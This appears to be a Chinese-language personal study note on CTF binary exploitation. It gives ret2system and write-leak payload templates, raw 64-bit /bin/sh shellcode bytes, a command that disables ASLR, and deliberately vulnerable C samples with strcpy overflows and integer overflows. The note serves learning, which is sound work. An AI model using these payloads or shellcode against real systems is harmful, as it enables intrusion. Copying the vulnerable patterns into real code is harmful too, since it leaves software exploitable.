### hint
- ida快捷键 
  - 提取数据 shift + E
  - 查找strings alt + T
  - 打开strings窗口 shift + F12
- 对于合起来的长字符，右键点一下data会按字节转换成几个
- db: 1个字节单元，dw: 2个字节单元，dd: 4个字节单元
- system函数：何时需要填补return地址
  - 第一种，溢出后的返回地址是system的地址，也就是plt表中system的地址   
    `payload = 'a' * (0x88 + 4) + p32(system_addr) + p32(return_addr) + p32(binsh_addr)`  
  - 第二种，溢出后的返回地址是call system的地址，这是程序中出现过的调用system的地址   
    `payload = 'a' * (0x88 + 4) + p32(system_addr) + p32(binsh_addr)`  
- 查找函数在plt表中的地址：  
  - `$ objdump -d -j .plt ./pwn | grep system`  
- 当plt表中没有system函数时，可以尝试shellcode（一串可以返回shell的机器指令码）
    ```python
    context.os='Linux'
    context.arch='amd64'
    shellcode = asm(shellcraft.sh())
    # 64位系统也可以直接用下面这个
    shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
    ```
- 查找ret地址：
  - `ROPgadget --binary pwn --only "pop|ret" `
- libc
  - 题目给了libc： `libc=ELF('libc-2.23.so')`  
    题目没给libc，用LibcSearcher自动识别一下：`libc=LibcSearcher('write',write_addr)`  
  - 查找基地址
    ```python
    elf = ELF("./pwn")
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    ```
  - write函数泄露地址  
    函数原型：  
    ```c
    ssize write(int fd,const void * buf,size_t count);
    ```  
    payload：首先将write_plt作为栈上的调用地址，main作为write_plt函数的返回地址方便下一步循环，1为write的写模式，写入的内容为write_got，写入长度为4字节（32位）  
    ```python
    payload=p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)
    write_addr=u32(p.recv(4))
    ```  
    原理：由于程序中有write函数，因此write装载在plt表中，可以直接用write_plt调用。在程序未调用write前，不会将write装载到got表里，因此需要先调用一次write_plt，装载之后got表里就存储了write的真实地址，再打印这个真实地址出来即可计算基地址。

### 环境
#### checksec
- STACK CANARY 栈保护 不能直接覆盖函数返回地址
- NX 输入的字段不可编译 用ROP绕过
- PIE 类似ASLR地址随机化
- FORTIFY 函数源码保护，read, printf等函数漏洞无法利用

#### gcc
- gcc -no-pie -fno-stack-protector -zexecstack -o testfile 
#### ASLR地址随机化
- 查看目前地址随机化模式(0不启用，1半启用，2启用)： 
`$ cat /proc/sys/kernel/randomize_va_space`  
- 修改ASLR：  
在root下：`# echo 0 > /proc/sys/kernel/randomize_va_space`  
在GDB场景下(默认关闭)：`set disable-randomization on`  
#### NX Bit
- Makes certain areas of memory non executable and makes an executable area, non writable.  
  Example: Data, stack and heap segments are made non executable while text segment is made non writable.

### [基础教程](https://sploitfun.wordpress.com/2015/)
#### 1.1 Stack  Buffer Overflow
不知道为什么无法复现，在root关掉ASLR的情况下跑Python2有问题，但是在GDB里面好像随机化依旧生效  
1. 源码vuln.c
    ```c
    //vuln.c
    #include <stdio.h>
    #include <string.h>

    int main(int argc, char* argv[]) {
        /* [1] */ char buf[256];
        /* [2] */ strcpy(buf,argv[1]);
        /* [3] */ printf("Input:%s\n",buf);
        return 0;
    }
    ```
2. 编译出可执行文件vuln，要加上-m32以编译成32位文件
    ```bash
    (root) echo 0 > /proc/sys/kernel/randomize_va_space
    $ gcc -m32 -g -fno-stack-protector -z execstack -o vuln vuln.c
    $ sudo chown root vuln | sudo chgrp root vuln | sudo chmod +s vuln
    ```
3. GDB查看
    ```bash
    $ gdb -q vuln
        - Reading symbols from ...
    (gdb) disassemble /*function_name*/
        - 查看汇编
    (gdb) r `python2 -c 'print "A"*300'`
        - Segmentation fault
    (gdb) p/x $eip
        - 查看寄存器，但是这里没办法复现
    ```
4. 计算地址  
    他的layout图嘎了，暂且没搞懂是怎么算的，确实不会

- 附 汇编录寄存器：  
  1. EIP寄存器里存储的是CPU下次要执行的指令的地址。也就是调用完fun函数后，让CPU知道应该执行main函数中的printf（"函数调用结束"）语句了。
  2. EBP寄存器里存储的是是栈的栈底指针，通常叫栈基址，这个是一开始进行fun()函数调用之前，由ESP传递给EBP的。（在函数调用前你可以这么理解：ESP存储的是栈顶地址，也是栈底地址。）
  3. ESP寄存器里存储的是在调用函数fun()之后，栈的栈顶。并且始终指向栈顶。
#### 1.2 Integer Overflow
应该和1.1同样，基础题，在电脑没关随机化之类的情况下啥也干不了
1. 源码vuln.c  
    和栈溢出类似，不过多了一次输入字节长度检查。但是可以利用整数溢出，例如本题中unsigned char变量passwd_len上限是256，那么当输入的字节长度为261时，发生溢出，passwd_len变为5，借此可以绕过长度检查，对下面进行栈溢出。
    ```c
    //vuln.c
    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>

    void store_passwd_indb(char* passwd) {
    }

    void validate_uname(char* uname) {
    }

    void validate_passwd(char* passwd) {
        char passwd_buf[11];
        unsigned char passwd_len = strlen(passwd); /* [1] */ 
        if(passwd_len >= 4 && passwd_len <= 8) { /* [2] */
            printf("Valid Password\n"); /* [3] */ 
            fflush(stdout);
            strcpy(passwd_buf,passwd); /* [4] */
        } else {
            printf("Invalid Password\n"); /* [5] */
            fflush(stdout);
        }
        store_passwd_indb(passwd_buf); /* [6] */
    }

    int main(int argc, char* argv[]) {
        if(argc!=3) {
            printf("Usage Error:   \n");
            fflush(stdout);
            exit(-1);
        }
        validate_uname(argv[1]);
        validate_passwd(argv[2]);
        return 0;
    }
    ```
#### 1.3 Off-By-One
1. 源码vuln.c  
    当source string length == destination buffer length会产生Off-By-One，原理是when EBP is located just above the destination buffer then after strcpy, a single NULL byte would have overwritten EBP.  
    这个暂时没看懂，待回头重看 
    ```c
    //vuln.c
    #include <stdio.h>
    #include <string.h>

    void foo(char* arg);
    void bar(char* arg);

    void foo(char* arg) {
        bar(arg); /* [1] */
    }

    void bar(char* arg) {
        char buf[256];
        strcpy(buf, arg); /* [2] */
    }

    int main(int argc, char *argv[]) {
        if(strlen(argv[1])>256) { /* [3] */
            printf("Attempted Buffer Overflow\n");
            fflush(stdout);
            return -1;
        }
        foo(argv[1]); /* [4] */
        return 0;
    }
    ```
#### 2.1 NX return-to-libc
1. 源码vuln.c
    ```c
    //vuln.c
    #include <stdio.h>
    #include <string.h>

    int main(int argc, char* argv[]) {
        char buf[256]; /* [1] */ 
        strcpy(buf,argv[1]); /* [2] */
        printf("%s\n",buf); /* [3] */
        fflush(stdout);  /* [4] */
        return 0;
    }
    ```
2. 原理
   NX bit can be bypassed using an attack technique called **return-to-libc**. Here return address is overwritten with a particular libc function address (instead of stack address containing the shellcode). 不能直接执行输入system(/bin/sh)，在栈里输入/bin/sh然后在libc；里调用已有的system()函数。
#### 2.2 NX chained return-to-libc
1. 源码vuln.c
   在用户交互前使用退出root权限，即使被攻破也不能更改系统文件
   ```c
    //vuln.c
    #include <stdio.h>
    #include <string.h>

    int main(int argc, char* argv[]) {
    char buf[256];
    seteuid(getuid()); /* Temporarily drop privileges */
    strcpy(buf,argv[1]);
    printf("%s",buf);
    fflush(stdout);
    return 0;
    }
   ```
2. 原理
   链式调用libc，获得seteuid(0)
